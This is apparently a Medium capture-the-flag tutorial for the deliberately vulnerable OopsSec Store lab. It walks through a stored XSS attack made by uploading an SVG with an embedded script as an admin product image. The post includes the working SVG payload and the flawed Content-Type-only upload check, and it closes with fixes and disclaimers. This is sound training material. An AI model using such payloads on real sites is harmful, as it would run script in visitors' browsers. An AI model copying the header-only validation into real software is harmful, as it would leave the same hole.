# Turning an Image Upload Into a Site-Wide Stored XSS

> **Author**: OopsSec Store
> **Published**: Jan 24, 2026

---

## How a single SVG upload compromises every visitor

![OopsSec Store](https://miro.medium.com/v2/resize:fill:32:32/1*eBaZCG-O4z2c_UnbKdKPUA.jpeg)

Listen

Share

In today’s tutorial, you’re going to exploit a malicious file upload to get a stored XSS via SVG.

The payload executes for admins and regular users viewing a product page.

You’ll use OopsSec Store as a local lab and chain this bug after previous compromises.

Before starting, make sure you already own an admin account. This walkthrough assumes admin access obtained through earlier vulnerabilities:

- SQL injection to dump the admin password hash
- Chaining SQL injection with weak MD5 hashing to log in as admin

If you skipped those, stop here and do them first. This exploit depends on that access.

## GitHub - kOaDT/oss-oopssec-store: Run `npx create-oss-store`, open your browser, and start hunting…

### Run `npx create-oss-store`, open your browser, and start hunting flags. Deliberately vulnerable Next.js e-commerce for…

github.com

## Setting Up the Lab

If you don’t already have an instance of the project locally, open a terminal and run:

```
npx create-oss-store oss-store
cd oss-store
npm run dev
```

This does everything for you. Dependencies get installed. A database is created. Test data is injected.

Once it’s done, open your browser and go to:

```
http://localhost:3000
```

Log in using the admin credentials you recovered in the previous writeups. If you don’t see the admin interface, you’re not ready yet.

## What You’re Targeting

You’re attacking the product image upload feature in the admin panel.

As an admin, you can:

- Go to /admin/products
- Edit a product and upload an image for that product

The application accepts several image formats, including SVG. That’s the mistake. SVG isn’t just an image format, it’s XML. And XML can contain JavaScript.

Even worse, the backend only checks the Content-Type header. There’s no file inspection and no sanitization.

Whatever you upload gets stored and served back to users.

## Step-by-Step Exploitation

### 1. Access the Product Management Page

While logged in as admin, go to:

```
http://localhost:3000/admin/products
```

### 2. Create a Malicious SVG

On your machine, create a file called xss.svg.

Paste this payload inside:

```
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="#4ade80"/>
  <script type="text/javascript">
    alert('XSS executed!');
  </script>
</svg>
```

This is enough.

### 3. Upload the SVG

Back in /admin/products:

- Click the image upload field
- Select xss.svg
- Save the product

The server accepts it without complaint.

![image](https://miro.medium.com/v2/resize:fit:439/1*mEYV24MOHvKBdi61STkyag.png)

### 4. Trigger the Payload

The payload executes in multiple places.

Try any of these:

- Stay on the admin page and look at the product preview
- Open the product page as a regular user: http://localhost:3000/products/[product-id]

You immediately see:

```
alert('XSS executed!')
```

That JavaScript runs in the visitor’s browser.

![image](https://miro.medium.com/v2/resize:fit:1000/1*kA6AAcUcHOWIv3u_O-l43g.png)

## Capturing the Flag

The flag appears right after a successful upload.

![image](https://miro.medium.com/v2/resize:fit:700/1*mTbtDjZGKBxndfaqr6K_Sg.png)

As soon as the SVG is stored and rendered, the application displays the flag on screen to confirm exploitation.

## Get OopsSec Store’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

If you see the alert and the flag, the exploit worked.

## Why This Vulnerability Exists

Several bad assumptions stack together.

### 1. Trusting the Content-Type Header

The backend only checks:

```
if (!ALLOWED_CONTENT_TYPES.includes(file.type)) {
  throw new Error("Invalid file type");
}
```

That value is fully controlled by the client. You can spoof it in seconds.

### 2. Allowing SVG Without Sanitization

SVG can contain:

- <script> tags
- Event handlers like onload
- External references

Uploading SVG without sanitizing it is equivalent to allowing raw HTML.

### 3. Unsafe Rendering on the Frontend

The frontend renders SVGs using an <object> tag. That guarantees JavaScript execution.

## How to Fix It

In a real application, you have several options.

### Option 1: Don’t Allow SVG at All

This is the safest choice. Detect the actual file type, not the header:

```
import { fileTypeFromBuffer } from "file-type";

const buffer = Buffer.from(await file.arrayBuffer());
const detectedType = await fileTypeFromBuffer(buffer);
const SAFE_TYPES = ["image/jpeg", "image/png", "image/webp"];
if (!detectedType || !SAFE_TYPES.includes(detectedType.mime)) {
  throw new Error("Invalid file type");
}
```

### Option 2: Sanitize SVG Properly

If SVG support is mandatory, sanitize it before saving:

- Remove scripts
- Remove event handlers
- Strip external references

Client-side checks are useless here. This must happen server-side.

### Option 3: Lock Down File Serving

Even sanitized files should be served defensively:

- Content-Security-Policy: script-src 'none'
- X-Content-Type-Options: nosniff

## Wrapping Up

This bug isn’t exotic. It shows up in real products every year.

What makes it dangerous is the chaining:

- SQL injection gets you admin access
- Weak hashing makes it trivial
- A file upload finishes the job
- Every user becomes a victim

That’s how real compromises happen.

Training on deliberately vulnerable apps like OopsSec Store helps you see these chains early, before they reach production.

The full source code is available on GitHub.

## GitHub - kOaDT/oss-oopssec-store: Run `npx create-oss-store`, open your browser, and start hunting…

### Run `npx create-oss-store`, open your browser, and start hunting flags. Deliberately vulnerable Next.js e-commerce for…

github.com

## Disclaimers

Do not deploy OopsSec Store on a production server. This application is intentionally vulnerable and should only be used in isolated, local environments for educational purposes.

Do not exploit vulnerabilities on systems you don’t have explicit authorization to test. Unauthorized access to computer systems is illegal. Always obtain proper permission before performing security testing.

AI assistance was used in the writing of this writeup.

## Feedback & Support

Having trouble following this writeup? Found a typo or have suggestions for improvement?

Feel free to open an issue or start a discussion on GitHub.

👉 If you find this project useful, consider giving it a star or forking it to show support!

![image](https://miro.medium.com/v2/resize:fit:700/1*5PuHI-4VbNHtceespTrReg.png)



---
*Original URL: [https://medium.com/@oopssec-store/turning-an-image-upload-into-a-site-wide-stored-xss-60f39c82e827?source=search_post---------93-----------------------------------](https://medium.com/@oopssec-store/turning-an-image-upload-into-a-site-wide-stored-xss-60f39c82e827?source=search_post---------93-----------------------------------)*
